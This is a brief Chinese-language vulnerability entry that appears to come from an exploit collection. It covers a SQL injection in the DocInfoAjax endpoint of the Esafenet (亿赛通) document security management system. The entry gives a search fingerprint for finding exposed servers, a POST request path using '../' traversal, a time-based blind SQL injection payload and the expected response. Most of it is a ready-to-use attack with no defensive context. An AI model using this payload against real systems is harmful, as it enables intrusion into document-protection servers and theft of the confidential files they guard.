# 亿赛通电子文档安全管理系统DocInfoAjax存在SQL注入漏洞

亿赛通电子文档安全管理系统 ｜ SQL注入 ｜ —
- **指纹**：`app="亿赛通-DLP"`
- **请求**：`POST /CDGServer3/js/../DocInfoAjax HTTP/1.1`

**Payload**
```
command=JudgeHasFile&logicpath==-1'waitfor delay '0:0:5'--
```
- **响应特征**：200